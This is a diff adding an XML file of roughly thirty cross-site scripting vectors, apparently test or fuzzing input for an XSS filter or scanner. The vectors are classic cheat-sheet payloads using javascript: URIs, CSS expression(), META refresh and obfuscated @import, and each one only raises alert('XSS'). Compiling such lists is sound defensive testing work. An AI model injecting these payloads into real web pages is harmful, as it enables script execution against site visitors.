@@ -1,0 +1,93 @@
+<?xml version="1.0" ?>
+<xssalert>
+	<xssalertvector>
+		<vector><![CDATA[<IMG SRC="javascript:alert('XSS');">]]></vector>
+	</xssalertvector>
+	<xssalertvector>
+		<vector><![CDATA[<IMG SRC=javascript:alert('XSS')>]]></vector>
+	</xssalertvector>
+	<xssalertvector>
+		<vector><![CDATA[<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>]]></vector>
+	</xssalertvector>
+	<xssalertvector>
+		<vector><![CDATA[<IMG SRC=`javascript:alert("'XSS'")`>]]></vector>
+	</xssalertvector>
+	<xssalertvector>
+		<vector><![CDATA[<IMG """><SCRIPT>alert("XSS")</SCRIPT>">]]></vector>
+	</xssalertvector>
+	<xssalertvector>
+		<vector><![CDATA[<IMG SRC="javascript:alert('XSS')]]></vector>
+	</xssalertvector>
+	<xssalertvector>
+		<vector><![CDATA[<BODY ONLOAD=alert('XSS')>]]></vector>
+	</xssalertvector>
+	<xssalertvector>
+		<vector><![CDATA[<LINK REL="stylesheet" HREF="javascript:alert('XSS');">]]></vector>
+	</xssalertvector>
+	<xssalertvector>
+		<vector><![CDATA[<TABLE BACKGROUND="javascript:alert('XSS')">]]></vector>
+	</xssalertvector>
+	<xssalertvector>
+		<vector><![CDATA[<TABLE><TD BACKGROUND="javascript:alert('XSS')">]]></vector>
+	</xssalertvector>
+	<xssalertvector>
+		<vector><![CDATA[<DIV STYLE="background-image: url(javascript:alert('XSS'))">]]></vector>
+	</xssalertvector>
+	<xssalertvector>
+		<vector><![CDATA[<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS]]></vector>
+	</xssalertvector>
+	<xssalertvector>
+		<vector><![CDATA[<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">]]></vector>
+	</xssalertvector>
+	<xssalertvector>
+		<vector><![CDATA[<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">]]></vector>
+	</xssalertvector>
+	<xssalertvector>
+		<vector><![CDATA[<IFRAME SRC="javascript:alert('XSS');"></IFRAME>]]></vector>
+	</xssalertvector>
+	<xssalertvector>
+		<vector><![CDATA[<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>]]></vector>
+	</xssalertvector>
+	<xssalertvector>
+		<vector><![CDATA[<TABLE BACKGROUND="javascript:alert('XSS')">]]></vector>
+	</xssalertvector>
+	<xssalertvector>
+		<vector><![CDATA[<TABLE><TD BACKGROUND="javascript:alert('XSS')">]]></vector>
+	</xssalertvector>
+	<xssalertvector>
+		<vector><![CDATA[<DIV STYLE="background-image: url(javascript:alert('XSS'))">]]></vector>
+	</xssalertvector>
+	<xssalertvector>
+		<vector><![CDATA[<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">]]></vector>
+	</xssalertvector>
+	<xssalertvector>
+		<vector><![CDATA[<DIV STYLE="width: expression(alert('XSS'));">]]></vector>
+	</xssalertvector>
+	<xssalertvector>
+		<vector><![CDATA[<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>]]></vector>
+	</xssalertvector>
+	<xssalertvector>
+		<vector><![CDATA[<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">]]></vector>
+	</xssalertvector>
+	<xssalertvector>
+		<vector><![CDATA[<XSS STYLE="xss:expression(alert('XSS'))">]]></vector>
+	</xssalertvector>
+	<xssalertvector>
+		<vector><![CDATA[<STYLE TYPE="text/javascript">alert('XSS');</STYLE>]]></vector>
+	</xssalertvector>
+	<xssalertvector>
+		<vector><![CDATA[<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>]]></vector>
+	</xssalertvector>
+	<xssalertvector>
+		<vector><![CDATA[<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>  ]]></vector>
+	</xssalertvector>
+	<xssalertvector>
+		<vector><![CDATA[<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->]]></vector>
+	</xssalertvector>
+	<xssalertvector>
+		<vector><![CDATA[<BASE HREF="javascript:alert('XSS');//">]]></vector>
+	</xssalertvector>
+	<xssalertvector>
+		<vector><![CDATA[<DIV STYLE="width: expression(alert('XSS'));">]]></vector>
+	</xssalertvector>
+</xssalert>
